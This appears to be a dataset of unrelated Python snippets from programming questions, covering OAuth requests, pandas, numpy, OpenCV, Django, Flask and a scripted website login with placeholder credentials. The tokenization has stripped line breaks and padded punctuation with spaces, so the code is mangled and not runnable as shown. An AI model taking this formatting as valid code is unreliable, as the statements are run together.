"import requestsfrom rauth import OAuth1Servicefrom rauth import OAuth1Sessionconsumer_key = { the consumer key } consumer_secret = { the consumer secret } access_token = { the access token } access_token_secret = { the access token secret } oauth_service = OAuth1Service ( consumer_key = consumer_key , consumer_secret = consumer_secret ) oauth_session = oauth_service.get_session ( token = ( access_token , access_secret ) ) url = 'https : //api.twitter.com/1.1/statuses/home_timeline.json'params = { 'include_rts ' : 'true ' } r = oauth_session.get ( url , params=params ) # THIS WORKSr = oauth_session.get ( url , params=params ) # THIS RETURNS 401 ERROR r = oauth_session.get ( url ) # THIS WORKSr = oauth_session.get ( url ) # THIS WORKS r = oauth_session.get ( url , params= { } ) # THIS WORKSr = oauth_session.get ( url , params= { } ) # THIS RETURNS 401 ERROR"
"# The lines below are for Hackerrank submissions # n , k = map ( int , raw_input ( ) .strip ( ) .split ( ' ' ) ) # a = map ( int , raw_input ( ) .strip ( ) .split ( ' ' ) ) n = 4k = 3a = [ 1 , 7 , 2 , 4 ] while True : all_pairs = [ ( a [ i ] , a [ j ] ) for i in range ( len ( a ) ) for j in range ( i+1 , len ( a ) ) ] tested_pairs = { pair : ( pair [ 0 ] + pair [ 1 ] ) % k ! = 0 for pair in all_pairs } disqualified_pairs = { key : value for key , value in tested_pairs.iteritems ( ) if not value } .keys ( ) if not disqualified_pairs : break occurrences = list ( sum ( disqualified_pairs , ( ) ) ) counts = map ( lambda x : occurrences.count ( x ) , a ) index_remove = counts.index ( max ( counts ) ) a.remove ( index_remove ) print len ( a ) n = 4k = 2a = [ 1 , 2 , 3 ] while True : all_pairs = [ ( a [ i ] , a [ j ] ) for i in range ( len ( a ) ) for j in range ( i+1 , len ( a ) ) ] disqualified_pairs = [ pair for pair in all_pairs if ( pair [ 0 ] + pair [ 1 ] ) % k == 0 ] if not disqualified_pairs : break offending_numbers = sum ( disqualified_pairs , ( ) ) # 'Flatten ' the disqualified pairs into a single list counts = { el : offending_numbers.count ( el ) for el in set ( offending_numbers ) } # Count occurrences of each offending number number_to_remove = max ( counts , key=counts.__getitem__ ) a.remove ( number_to_remove ) print len ( a )"
"RoomType = namedtuple ( 'Room ' , 'Type , EntranceLst ' ) typeA = RoomType ( `` A '' , [ `` Bottom '' ] ) ... currentRoomType = typeAcurrentRoomPos = ( 0,0 ) navMap = { currentRoomPos : currentRoomType } navMap = { currentRoomPos : currentRoomType } navMap = { currentRoomPos : `` A '' }"
"endpoint = `` http : //127.0.0.1:8080/openrdf-workbench/repositories/movies/explore ? resource= % 3Cfile % 3A % 2F % 2Fmovies_export.rdf % 3E '' from rdflib import Graphg = Graph ( ) g.parse ( endpoint ) Traceback ( most recent call last ) : File `` C : \Software\rdflib\movieGraph.py '' , line 10 , in < module > g.parse ( endpoint ) File `` c : \python26_32bit\lib\site-packages\rdflib\graph.py '' , line 756 , in parse parser = plugin.get ( format , Parser ) ( ) File `` c : \python26_32bit\lib\site-packages\rdflib\plugin.py '' , line 89 , in get raise PluginException ( `` No plugin registered for ( % s , % s ) '' % ( name , kind ) ) rdflib.plugin.PluginException : No plugin registered for ( application/xml , < class 'rdflib.parser.Parser ' > )"
import pdb ; pdb.set_trace ( ) ( Pdb ) b 20 *** Blank or comment ( Pdb ) break 20 *** Blank or comment `
"class MyObject ( object ) : def __init__ ( self ) : self.var_1 = 1 self.var_2 = 2 self.var_3 = 3 self.current_var = self.var_1 def update_var ( self , value ) : self.current_var = ... > > > x = MyObject ( ) > > > x.update_var ( 10 ) > > > x.var_110 > > > x.current_var = x.var_2 > > > x.update_var ( 5 ) > > > x.var_25"
"> > > re.escape ( ' ' ) '\\ ' > > > re.escape ( ' ' ) .decode ( 'string-escape ' ) '\\ ' > > > re.escape ( b ' ' ) b'\\ ' > > > re.escape ( b ' ' ) .decode ( 'unicode_escape ' ) '\\ ' > > > codecs.escape_decode ( re.escape ( b ' ' ) ) ( b'\\ ' , 2 ) > > > ast.literal_eval ( re.escape ( b ' ' ) ) ValueError : malformed node or string : b'\\ ' > > > re.sub ( r'\\ ( . ) ' , r'\1 ' , re.escape ( ' ' ) ) ' '"
"if len ( list1 ) < 5 : list2.extend ( list1 ) # at this point , I want to add the empty strings , completing the list of size 5"
"> > > import numpy as np > > > a , b = np.array ( [ 844 ] ) , np.array ( [ 8186 ] ) > > > a.dtype , b.dtype ( dtype ( 'int32 ' ) , dtype ( 'int32 ' ) ) > > > np.true_divide ( a , b , dtype=np.float32 ) array ( [ 0.10310286 ] , dtype=float32 ) > > > np.true_divide ( a , b , dtype=np.float64 ) array ( [ -12.66666667 ] ) # different result > > > np.true_divide ( a , b , dtype=np.float32 ) .astype ( np.float64 ) array ( [ 0.10310286 ] ) > > > a , b = np.array ( [ 1 ] ) , np.array ( [ 2 ] ) > > > np.true_divide ( a , b , dtype=np.float32 ) array ( [ 0.5 ] , dtype=float32 ) > > > np.true_divide ( a , b , dtype=np.float64 ) array ( [ 0.5 ] ) # same results"
"from collections import defaultdictD = lambda : defaultdict ( D ) d = D ( ) keys = [ 'k1 ' , 'k2 ' , 'k3 ' ] value = ' v'if len ( keys ) == 3 : k1 , k2 , k3 = keys d [ k1 ] [ k2 ] [ k3 ] = valueelse : ? ? ?"
"> > > a = 1 # match this , as there 're 3 spaces at the beginning > > > b = a # match this too , as indent by 7 spaces > > > c = 2 # but not this , since it 's indented exactly by 4 spaces > > > d = c # not this either , since indented by 8 spaces ^ ( { 16 } | { 12 } | { 8 } | { 4 } ) ^ [ ^ ( { 16 } | { 12 } | { 8 } | { 4 } ) ] ^ ( ? : \s { 4 } ) *\s { 1,3 } \S ^ ( ? ! ( \s { 4 } ) +\S ) ( . * )"
"@ app.route ( `` / '' ) async def test ( request ) : time.sleep ( 5 ) return json ( { `` hello '' : `` world '' } ) $ python app.py2017-02-18 19:15:22,242 : INFO : Goin ' Fast @ http : //0.0.0.0:80002017-02-18 19:15:22,245 : INFO : Starting worker [ 15867 ] $ time curl http : //0.0.0.0:8000/ { `` hello '' : '' world '' } real 0m5.009suser 0m0.003ssys 0m0.001s $ time curl http : //0.0.0.0:8000/ { `` hello '' : '' world '' } real 0m9.459suser 0m0.000ssys 0m0.004s"
"def not_mykey_dont_do_this ( ) : print ' I better not do this'def mykey_do_something ( ) : print 'Doing something ! 'def mykey_do_somethingelse ( ) : print 'Doing something else ! ' import module_alist_from_a = dir ( module_a ) # [ 'not_mykey_dont_do_this ' , 'mykey_do_something ' , 'mykey_do_somethingelse ' ] for mod in list_from_a : if ( mod.startswith ( 'mykey_ ' ) : # Run the module module_a.mod ( ) # Note that this will *not* work because 'mod ' is a string Doing something ! Doing something else !"
"from datetime import datetimedf = pd.DataFrame ( { 'ActivityDateTime ' : [ datetime ( 2016,5,13,6,14 ) , datetime ( 2016,5,13,6,16 ) , datetime ( 2016,5,13,6,20 ) , datetime ( 2016,5,13,6,27 ) , datetime ( 2016,5,13,6,31 ) , datetime ( 2016,5,13,6,32 ) , datetime ( 2016,5,13,17,34 ) , datetime ( 2016,5,13,17,36 ) , datetime ( 2016,5,13,17,38 ) , datetime ( 2016,5,13,17,45 ) , datetime ( 2016,5,13,17,47 ) , datetime ( 2016,5,16,13,3 ) , datetime ( 2016,5,16,13,6 ) , datetime ( 2016,5,16,13,10 ) , datetime ( 2016,5,16,13,14 ) , datetime ( 2016,5,16,13,16 ) ] , 'Value1 ' : [ 0.0,2.0,3.0,4.0,0.0,0.0,0.0,7.0,8.0,4.0,0.0,0.0,3.0,9.0,1.0,0.0 ] , 'Value2 ' : [ 0.0,2.0,3.0,4.0,0.0,0.0,0.0,7.0,8.0,4.0,0.0,0.0,3.0,9.0,1.0,0.0 ] } ) ActivityDateTime Value1 Value20 2016-05-13 06:14:00 0.0 0.01 2016-05-13 06:16:00 2.0 2.02 2016-05-13 06:20:00 3.0 3.03 2016-05-13 06:27:00 4.0 4.04 2016-05-13 06:31:00 0.0 0.05 2016-05-13 06:32:00 0.0 0.06 2016-05-13 17:34:00 0.0 0.07 2016-05-13 17:36:00 7.0 7.08 2016-05-13 17:38:00 8.0 8.09 2016-05-13 17:45:00 4.0 4.010 2016-05-13 17:47:00 0.0 0.011 2016-05-16 13:03:00 0.0 0.012 2016-05-16 13:06:00 3.0 3.013 2016-05-16 13:10:00 9.0 9.014 2016-05-16 13:14:00 1.0 1.015 2016-05-16 13:16:00 0.0 0.0 Activity_end Activity_start Value1 Value2 num_observations0 2016-05-13 06:27:00 2016-05-13 06:16:00 4.50 4.50 31 2016-05-13 17:45:00 2016-05-13 17:36:00 6.33 6.33 32 2016-05-16 13:14:00 2016-05-16 13:06:00 4.33 4.33 3"
"format = element [ 1 ] if isinstance ( format , tuple ) : format , operator , operand = formatelse : operator , operand = ( None , None )"
"test ( insert_at_end ( 5 , [ 1 , 3 , 4 , 6 ] ) , ** [ 1 , 3 , 4 , 6 , 5 ] ** ) test ( insert_at_end ( ' x ' , 'abc ' ) , **'abcx'** ) test ( insert_at_end ( 5 , ( 1 , 3 , 4 , 6 ) ) , ** ( 1 , 3 , 4 , 6 , 5 ) ** ) def encapsulate ( val , seq ) : if type ( seq ) == type ( `` '' ) : return str ( val ) if type ( seq ) == type ( [ ] ) : return [ val ] return ( val , ) def insert_at_end ( val , seq ) : return seq + encapsulate ( val , seq )"
"pack ( 'Nc* ' , $ some_integer , $ long_array_of_integers ) ;"
logger1 = logging.getLogger ( 'logger1 ' ) logger2 = logging.getLogger ( 'logger2 ' )
"class Page ( View ) : def get ( self , request , *args , **kwargs ) : response = Data.objects.all ( ) # for whatever reason , I want to print something right now : print response # return JsonResponse ( { 'success ' : response } ) The view did n't return an HttpResponse object . It returned None instead . [ object Object ] [ object Object ] [ object Object ]"
szConnStrIn = `` driver=ospath/dbodbc6.dll ; dbf=c : \asademo.db ''
"vars = [ 'age ' , 'balance ' , 'day ' , 'duration ' , 'campaign ' , 'pdays ' , 'previous ' , 'job_admin . ' , 'job_blue-collar ' ] ( array ( [ 1 , 5 , 7 ] , dtype=int64 ) , ) vars = [ 'balance ' , 'pdays ' , 'job_admin . ' ] for i , a in enumerate ( X ) : if i in new_L : print i"
"def f ( x = [ 1 , 2 , 3 ] ) : x.append ( 4 ) print ( x ) f ( ) f ( )"
"4 . 4.- 2 -- 2 -- ... 50 44162034028664377246354505728 def encode ( msg , repetition , morse= { ' . ' : '- . ' , '- ' : ' ... - ' } ) : if isinstance ( repetition , str ) : repetition = eval ( repetition ) while repetition > 0 : newmsg = `` .join ( morse [ c ] for c in msg ) return encode ( newmsg , repetition-1 ) return len ( msg ) def problem1 ( fn ) : with open ( fn ) as f : f.next ( ) for line in f : print encode ( *line.split ( ) ) def encode ( p , s , repetition ) : while repetition > 0 : p , s = p + 3*s , p + s return encode ( p , s , repetition-1 ) return p + sdef problem1 ( fn ) : with open ( fn ) as f : f.next ( ) for line in f : msg , repetition = line.split ( ) print encode ( msg.count ( ' . ' ) , msg.count ( '- ' ) , int ( repetition ) )"
"0 NaT1 1996-04-012 2000-03-013 NaT4 NaT5 NaT6 NaT7 NaT8 NaT mydata [ 'mynewdate ' ] = mydata.mydate.replace ( np.NaN , pd.datetime ( 1994,6,30,0,0 ) ) 0 1994-06-301 1996-04-012 2000-03-013 1994-06-304 1994-06-305 1994-06-306 1994-06-307 1994-06-308 1994-06-30 mydata [ 'mynewdate ' ] = np.where ( mydata [ 'mydate ' ] .isnull ( ) , pd.datetime ( 1994,6,30,0,0 ) , mydata [ 'mydate ' ] ) 0 1994-06-30 00:00:001 8283168000000000002 9518688000000000003 1994-06-30 00:00:004 1994-06-30 00:00:005 1994-06-30 00:00:006 1994-06-30 00:00:007 1994-06-30 00:00:008 1994-06-30 00:00:00 mydata [ 'mynewdate ' ] = np.where ( mydata [ 'mydate ' ] .isnull ( ) , pd.datetime ( 1994,6,30,0,0 ) , pd.to_datetime ( mydata [ 'mydate ' ] ) ) 0 1994-06-30 00:00:001 8283168000000000002 9518688000000000003 1994-06-30 00:00:004 1994-06-30 00:00:005 1994-06-30 00:00:006 1994-06-30 00:00:007 1994-06-30 00:00:008 1994-06-30 00:00:00"
"import cv2import numpy as npdef remove_lines ( filename ) : img = cv2.imread ( filename ) gray = cv2.cvtColor ( img , cv2.COLOR_BGR2GRAY ) edges = cv2.Canny ( gray , 50 , 200 ) lines = cv2.HoughLinesP ( edges , rho=1 , theta=1*np.pi/180 , threshold=100 , minLineLength=100 , maxLineGap=5 ) # Draw lines on the image for line in lines : x1 , y1 , x2 , y2 = line [ 0 ] cv2.line ( img , ( x1 , y1 ) , ( x2 , y2 ) , ( 0 , 0 , 255 ) , 3 ) cv2.imwrite ( 'result ' , img ) import cv2import numpy as npdef remove_lines ( filename ) : im = cv2.imread ( filename ) gray = cv2.cvtColor ( im , cv2.COLOR_BGR2GRAY ) # Create default parametrization LSD lsd = cv2.createLineSegmentDetector ( 0 ) # Detect lines in the image ( Position 0 of the returned tuple are the # detected lines ) lines = lsd.detect ( gray ) [ 0 ] # drawn_img = lsd.drawSegments ( res , lines ) for element in lines : if ( abs ( int ( element [ 0 ] [ 0 ] ) - int ( element [ 0 ] [ 2 ] ) ) > 70 or abs ( int ( element [ 0 ] [ 1 ] ) - int ( element [ 0 ] [ 3 ] ) ) > 70 ) : cv2.line ( im , ( int ( element [ 0 ] [ 0 ] ) , int ( element [ 0 ] [ 1 ] ) ) , ( int ( element [ 0 ] [ 2 ] ) , int ( element [ 0 ] [ 3 ] ) ) , ( 0 , 0 , 255 ) , 3 ) cv2.imwrite ( 'lsd.jpg ' , im )"
"import wximport wx.lib.plot as plotclass Pantalla ( wx.Frame ) : def __init__ ( self ) : app = wx.App ( ) self.frame1 = wx.Frame ( None , title = `` GRAFICADOR '' , id = -1 , size= ( 500,500 ) ) self.panel1 = wx.Panel ( self.frame1 ) self.panel1.SetBackgroundColour ( `` white '' ) plotter = plot.PlotCanvas ( self.panel1 , id=-1 , pos = wx.Point ( -1 , -1 ) , size = wx.Size ( -1 , -1 ) , style = 0 , name= 'plotCanvas ' ) data = [ ( 1,2 ) , ( 2,3 ) , ( 4,6 ) ] line = plot.PolyLine ( data , colour='red ' , width = 1 ) gc = plot.PlotGraphics ( [ line ] , 'Line ' , 'Eje x ' , 'Eje y ' ) plotter.Draw ( gc , xAxis = ( 0,15 ) , yAxis= ( 0,15 ) ) self.frame1.Show ( True ) app.MainLoop ( ) t = Pantalla ( ) Traceback ( most recent call last ) : File `` < pyshell # 26 > '' , line 1 , in < module > f = Pantalla ( ) File `` < pyshell # 25 > '' , line 7 , in __init__ plotter = plot.PlotCanvas ( self.panel1 , id=-1 , pos = wx.Point ( -1 , -1 ) , size = wx.Size ( -1 , -1 ) , style = 0 , name= 'plotCanvas ' ) File `` C : \Python27\lib\site-packages\wx-3.0-msw\wx\lib\plot.py '' , line 598 , in __init__ self.HandCursor = wx.Cursor ( Hand.GetImage ( ) ) File `` C : \Python27\lib\site-packages\wx-3.0-msw\wx\_gdi.py '' , line 1547 , in __init__ _gdi_.Cursor_swiginit ( self , _gdi_.new_Cursor ( *args , **kwargs ) ) TypeError : Required argument 'type ' ( pos 2 ) not found"
"import timeittic = timeit.default_timer ( ) tic4 = timeit.default_timer ( ) import xlrd as xlimport psycopg2 as pqimport osimport pandas as pd import numpy as npimport csvfrom pprint import pprint as ppperf_dir = '/myhomedir'toc4=timeit.default_timer ( ) # Create the databasetic1= timeit.default_timer ( ) os.system ( 'dropdb ptest ' ) os.system ( 'createdb ptest ' ) # connect to the databasecn = pq.connect ( 'dbname=ptest user=me ' ) cr = cn.cursor ( ) toc1=timeit.default_timer ( ) # Create the tables : # # # load csvstic2=timeit.default_timer ( ) id_files = ( 'di1 ' , 'di2 ' , 'di.c ' ) id_files = [ i+r'.csv ' for i in id_files ] id1 = csv.reader ( open ( os.path.join ( perf_dir , id_files [ 0 ] ) ) , delimiter='\t ' ) id1 = [ i for i in id1 ] id2 = csv.reader ( open ( os.path.join ( perf_dir , id_files [ 1 ] ) ) ) id2 = [ i for i in id2 ] id3 = csv.reader ( open ( os.path.join ( perf_dir , id_files [ 2 ] ) ) , delimiter='\t ' ) id3 = [ i for i in id3 ] id3 = [ i [ 1:3 ] for i in id3 ] toc2=timeit.default_timer ( ) # create tables and fill # # # id1 fund classificationstic3=timeit.default_timer ( ) cr.execute ( 'CREATE TABLE id1 ( % s varchar , % s int PRIMARY KEY , % s int , % s int , % s varchar ) ' % tuple ( id1 [ 0 ] ) ) FLDS = 'INSERT INTO id1 ( % s , % s , % s , % s , % s ) VALUES ' % tuple ( id1 [ 0 ] ) SQL = FLDS + ' ( % s , % s , % s , % s , % s ) 'for i in range ( 1 , len ( id1 ) ) : data = tuple ( id1 [ i ] ) cr.execute ( SQL , data ) # # # id2 portfolio group classifications - reference onlycr.execute ( 'CREATE TABLE id2 ( % s varchar , % s int PRIMARY KEY , % s int ) ' % tuple ( id2 [ 0 ] ) ) SQL = 'INSERT INTO id2 ( % s , % s , % s ) VALUES ' % tuple ( id2 [ 0 ] ) + ' ( % s , % s , % s ) 'for i in range ( 1 , len ( id2 ) ) : data = tuple ( id2 [ i ] ) cr.execute ( SQL , data ) # # # id3 value variable classificationscr.execute ( 'CREATE TABLE id3 ( % s varchar , % s varchar ) ' % tuple ( id3 [ 0 ] ) ) SQL = 'INSERT INTO id3 VALUES ( % s , % s ) 'for i in range ( 1 , len ( id3 ) ) : data = tuple ( id3 [ i ] ) cr.execute ( SQL , data ) cn.commit ( ) # Timing block - will be commented out in final codetoc3=timeit.default_timer ( ) toc = timeit.default_timer ( ) time = ( toc - tic ) time1 = toc1 - tic1time2 = toc2 - tic2time3 = toc3 - tic3time4 = toc4 - tic4print ( 'Overall time : % s ' % time ) print ( 'dB create & connect time : % s ' % time1 ) print ( 'Load id csvs time : % s ' % time2 ) print ( 'Create tables and write to db time : % s ' % time3 ) print ( 'Time to import libraries : % s ' % time4 ) tic = proc.time ( ) library ( RPostgreSQL ) tic1 = proc.time ( ) system ( 'dropdb ptest1 ' ) system ( 'createdb ptest1 ' ) drv = dbDriver ( `` PostgreSQL '' ) con = dbConnect ( drv , dbname='ptest1 ' ) toc1 = proc.time ( ) time1 = toc1 - tic1tic2 = proc.time ( ) id.1 = read.csv ( '/myhomedir/di1.csv ' , stringsAsFactors=F , sep='\t ' ) id.2 = read.csv ( '/myhomedir/di2.csv ' , stringsAsFactors=F ) id.3 = read.csv ( '/myhomedir/di.c.csv ' , stringsAsFactors=F , sep='\t ' ) id.3 = id.3 [ , -1 ] toc2 = proc.time ( ) time2 = toc2 - tic2tic3 = proc.time ( ) dbWriteTable ( con , 'id1 ' , id.1 ) dbWriteTable ( con , 'id2 ' , id.2 ) dbWriteTable ( con , 'id3 ' , id.3 ) toc3 = proc.time ( ) time3 = toc3 - tic3toc = proc.time ( ) time = toc - tictyme = rbind ( time1 , time2 , time3 , time ) tyme = data.frame ( Function=c ( 'Create & Connect to DB ' , '' Load CSV 's for save '' , '' Write Table to DB '' , 'Overall Time ' ) , tyme ) > > > Overall time : 2.48381304741dB create & connect time : 1.96832108498Load id csvs time : 0.000378847122192Create tables and write to db time : 0.35303401947Time to import libraries : 0.162075042725 Function user.self sys.self elapsed user.child sys.childtime1 Create & Connect to DB 0.112 0.016 1.943 0.06 0.004time2 Load CSV 's for save 0.008 0.000 0.006 0.00 0.000time3 Write Table to DB 0.096 0.004 0.349 0.00 0.000time Overall Time 0.376 0.028 2.463 0.06 0.004"
"H++++.++++.-..+.-..+ -- -++ , +++++++++W++++ -- -++.-.++.-..+-..++ H4+.4+.-2.+.-2.+3-2+,9+W4+3-2+.-.2+.-2.+-2.2+ # ! /usr/bin/python3import itertoolsimport stringclass MorseString ( str ) : def __init__ ( self , string ) : # or , pad values during iteration but this seems neater self._char_morse_map = { `` a '' : '' .-+++ '' , `` b '' : '' - ... + '' , `` c '' : '' -.-.+ '' , `` d '' : '' -..++ '' , \ `` e '' : '' .++++ '' , `` f '' : '' ..-.+ '' , `` g '' : '' -- .++ '' , `` h '' : '' ... .+ '' , \ `` i '' : '' ..+++ '' , `` j '' : '' . -- -+ '' , `` k '' : '' -.-++ '' , `` l '' : '' .-..+ '' , \ `` m '' : '' -- +++ '' , `` n '' : '' -.+++ '' , `` o '' : '' -- -++ '' , `` p '' : '' . -- .+ '' , \ `` q '' : '' -- .-+ '' , `` r '' : '' .-.++ '' , `` s '' : '' ... ++ '' , `` t '' : '' -++++ '' , \ `` u '' : '' ..-++ '' , `` v '' : '' ... -+ '' , `` w '' : '' . -- ++ '' , `` x '' : '' -..-+ '' , \ `` y '' : '' -. -- + '' , `` z '' : '' -- ..+ '' , `` 1 '' : '' . -- -- '' , `` 2 '' : '' .. -- - '' , \ `` 3 '' : '' ... -- '' , `` 4 '' : '' ... .- '' , `` 5 '' : '' ... .. '' , `` 6 '' : '' - ... . '' , \ `` 7 '' : '' -- ... '' , `` 8 '' : '' -- -.. '' , `` 9 '' : '' -- -- . `` , `` 0 '' : '' -- -- - '' , `` `` : '' +++++ '' , `` . `` : '' d++++ '' , `` + '' : '' p++++ '' , `` - '' : '' h++++ '' } self._morse_char_map = dict ( ) for letter , code in self._char_morse_map.items ( ) : self._morse_char_map [ code ] = letter self._string = string # convert the string to `` Morse code '' . Could also use c.lower ( ) self._morse_string = `` '' .join ( [ self._char_morse_map.get ( c , c.ljust ( 5 , `` + '' ) ) for c in self._string ] ) def compress ( self ) : def grouper ( n , k ) : return str ( n ) + k if n > 1 else k # could just use lambda return `` '' .join ( [ grouper ( len ( list ( g ) ) , k ) for k , g in itertools.groupby ( self._morse_string ) ] ) def decompress ( self ) : i = 0 start = 0 chars = list ( ) sc = self.compress ( ) while i < len ( sc ) : curr = sc [ i ] i += 1 if not ( curr in string.digits ) : num = 1 if start + 1 == i else int ( sc [ start : i-1 ] ) chars.append ( `` '' .join ( curr * num ) ) start = i code = `` '' .join ( chars ) chars = list ( ) for i in range ( 0 , len ( code ) , 5 ) : piece = `` '' .join ( code [ i : i+5 ] ) chars.append ( self._morse_char_map.get ( piece , piece [ 0 ] ) ) return `` '' .join ( chars ) def main ( ) : s0 = `` Hello , World '' ms0 = MorseString ( s0 ) print ( ms0._morse_string ) print ( ms0.compress ( ) ) assert ( s0 == ms0.decompress ( ) ) s1 = `` Hello 2 world . '' ms1 = MorseString ( s1 ) assert ( s1 == ms1.decompress ( ) ) s2 = `` The quick brown fox jumped over the lazy dog . '' ms2 = MorseString ( s2 ) assert ( s2 == ms2.decompress ( ) ) s3 = `` abc -.+ '' ms3 = MorseString ( s3 ) ms3 assert ( s3 == ms3.decompress ( ) ) if __name__ == `` __main__ '' : main ( ) import itertoolsimport string_char_morse_map = { `` a '' : '' .- '' , `` b '' : '' - ... '' , `` c '' : '' -.- . `` , `` d '' : '' -.. '' , \ `` e '' : '' . `` , `` f '' : '' ..- . `` , `` g '' : '' -- . `` , `` h '' : '' ... . '' , \ `` i '' : '' .. '' , `` j '' : '' . -- - '' , `` k '' : '' -.- '' , `` l '' : '' .-.. '' , \ `` m '' : '' -- '' , `` n '' : '' - . `` , `` o '' : '' -- - '' , `` p '' : '' . -- . `` , \ `` q '' : '' -- .- '' , `` r '' : '' .- . `` , `` s '' : '' ... '' , `` t '' : '' - '' , \ `` u '' : '' ..- '' , `` v '' : '' ... - '' , `` w '' : '' . -- '' , `` x '' : '' -..- '' , \ `` y '' : '' -. -- '' , `` z '' : '' -- .. '' , `` 1 '' : '' . -- -- '' , `` 2 '' : '' .. -- - '' , \ `` 3 '' : '' ... -- '' , `` 4 '' : '' ... .- '' , `` 5 '' : '' ... .. '' , `` 6 '' : '' - ... . '' , \ `` 7 '' : '' -- ... '' , `` 8 '' : '' -- -.. '' , `` 9 '' : '' -- -- . `` , `` 0 '' : '' -- -- - '' , `` `` : '' '' , `` . `` : '' d '' , `` + '' : '' p '' , `` - '' : '' h '' } _morse_char_map = { code : letter for letter , code in _char_morse_map.items ( ) } def encode ( s ) : return `` '' .join ( _char_morse_map.get ( c , c ) + `` + '' for c in s ) def decode ( encoded ) : return `` '' .join ( decode_gen ( encoded ) ) def decode_gen ( encoded ) : word = `` '' for c in encoded : if c ! = `` + '' : word += c else : yield _morse_char_map.get ( word , word ) if word ! = `` '' else `` `` word = `` '' def compress ( s ) : def grouper ( n , k ) : return str ( n ) + k if n > 1 else k return `` '' .join ( grouper ( len ( list ( g ) ) , k ) for k , g in itertools.groupby ( s ) ) def decompress ( compressed ) : return `` '' .join ( decompress_gen ( compressed ) ) def decompress_gen ( compressed ) : digits = `` '' for c in compressed : if c in string.digits : digits += c else : number = int ( digits ) if digits else 1 yield `` '' .join ( c * number ) digits = `` ''"
A header========A paragraph < span id= '' a-header '' > < /span > < h1 > A header < a class= '' headerlink '' title= '' Permalink to this headline '' href= '' # a-header '' > ¶ < /a > < /h1 > < p > A paragraph < /p > # A header [ ¶ ] ( # a-header ) { # a-header } A paragraph < h1 id= '' a-header '' > A header < a href= '' # a-header '' > ¶ < /a > < /h1 > h1 a { visibility : hidden ; } h1 : hover a { visibility : visible ; }
"# x and y given as DataFrame columnsimport plotly.express as pxdf = px.data.iris ( ) # iris is a pandas DataFramefig = px.scatter ( df , x= '' sepal_width '' , y= '' sepal_length '' ) fig.show ( )"
"~/pkg/ | +- package_a/ | | | +- __init__.py | +- mod_x.py | +- mod_y.py | +- package_b/ | | | +- __init__.py | +- mod_z.py | +- config/ | | | +- __init__.py | +- package_a.py # Should locally override < pkg > _sample.py | +- package_a_sample.py | +- package_b_sample.py | +- test_this.py # ~/pkg/test_this.pyimport config.package_a as cfg_a # ~/pkg/config/__init__.pyimport osimport imp__all__ = [ 'datastore ' ] _cfgbase = os.path.dirname ( os.path.realpath ( __file__ ) ) for cfgmodule in __all__ : if os.path.isfile ( os.path.join ( _cfgbase , cfgmodule + '.py ' ) ) : locals ( ) [ cfgmodule ] = imp.load_source ( cfgmodule , os.path.join ( _cfgbase , cfgmodule + '.py ' ) ) else : locals ( ) [ cfgmodule ] = imp.load_source ( cfgmodule , os.path.join ( _cfgbase , cfgmodule + '_sample.py ' ) ) locals ( ) [ cfgmodule ] j= imp.load_source ( 'config . ' + cfgmodule , os.path.join ( _cfgbase , cfgmodule + '.py ' ) )"
"csrfmiddlewaretoken : [ My token ] login : [ My username ] password : [ My password ] app : plfpl-webredirect_uri : https : //fantasy.premierleague.com/a/login Accept : text/html , application/xhtml+xml , application/xml ; q=0.9 , image/webp , */* ; q=0.8Accept-Encoding : gzip , deflate , brAccept-Language : en-US , en ; q=0.8Cache-Control : max-age=0Connection : keep-aliveContent-Length:185Content-Type : application/x-www-form-urlencodedCookie : [ My cookies ] Host : users.premierleague.comOrigin : https : //fantasy.premierleague.comReferer : https : //fantasy.premierleague.com/Upgrade-Insecure-Requests:1User-Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/52.0.2743.116 Safari/537.36 import requestswith requests.Session ( ) as session : url_home = 'https : //fantasy.premierleague.com/'html_home = session.get ( url_home ) csrftoken = session.cookies [ 'csrftoken ' ] values = { 'csrfmiddlewaretoken ' : csrftoken , 'login ' : < My username > , 'password ' : < My password > , 'app ' : 'plfpl-web ' , 'redirect_uri ' : 'https : //fantasy.premierleague.com/a/login ' } head = { 'Host ' : 'users.premierleague.com ' , 'Referer ' : 'https : //fantasy.premierleague.com/ ' , } session.post ( 'https : //users.premierleague.com/accounts/login/ ' , data = values , headers = head ) url_transfers = 'https : //fantasy.premierleague.com/a/squad/transfers'html_transfers = session.get ( url_transfers ) print ( html_transfers.content ) b'\n < html > \n < head > \n < title > Fastly error : unknown domain users.premierleague.com < /title > \n < /head > \n < body > \nFastly error : unknown domain : users.premierleague.com . Please check that this domain has been added to a service. < /body > < /html > ' b ''"
"class News ( models.Model ) : user = models.ForeignKey ( AUTH_USER_MODEL , on_delete=models.SET ( ? ? ? ) ) message - models.TextField ( )"
from flask import Flaskapp = Flask ( __name__ ) @ app.route ( `` / '' ) def hello ( ) : return `` Hello World ! `` if __name__ == `` __main__ '' : app.run ( )
"import threadingif __name__ == '__main__ ' : # 1 . Create the qt thread ( is MainThread in fact ) qtApp = QApplication ( sys.argv ) QApplication.setStyle ( QStyleFactory.create ( 'Fusion ' ) ) # 2 . Create the appThread appThread = threading.Thread ( name='appThread ' , target=appThreadFunc , args= ( p1 , p2 , ) ) appThread.start ( ) # 3 . Start the qt event loop qtApp.exec_ ( ) print ( 'Exiting program ' )"
"def CleanWhiteSpace ( theDict ) : stuff= [ ] for key , value in theDict.items ( ) : for d in value : if value ! = `` `` : stuff.append ( d ) print d theDict [ key ] =stuff if not value [ d ] : print value stuff= [ ] return theDict print CleanWhiteSpace ( { ' a ' : [ ' 1 ' , ' 2 ' ] , ' b ' : [ ' 3 ' , ' ' ] , ' c ' : [ ] } )"
"from tika import unpacktext = unpack.from_file ( 'example.pdf ' ) [ 'content ' ] 2018-11-02 15:30:25,533 [ MainThread ] [ WARNI ] Failed to see startup log message ; retrying ..."
"import randomclass Die ( object ) : `` '' '' Simulate a generic die . '' '' '' def __init__ ( self ) : self.sides = 6 self.roll ( ) def roll ( self ) : `` '' '' Updates the die with a random roll . '' '' '' self.value = 1+random.randrange ( self.sides ) return self.value def getValue ( self ) : `` '' '' Return the last value set by roll ( ) . '' '' '' return self.valuedef main ( ) : d1 , d2 = Die ( ) , Die ( ) for n in range ( 12 ) : print d1.roll ( ) , d2.roll ( ) main ( )"
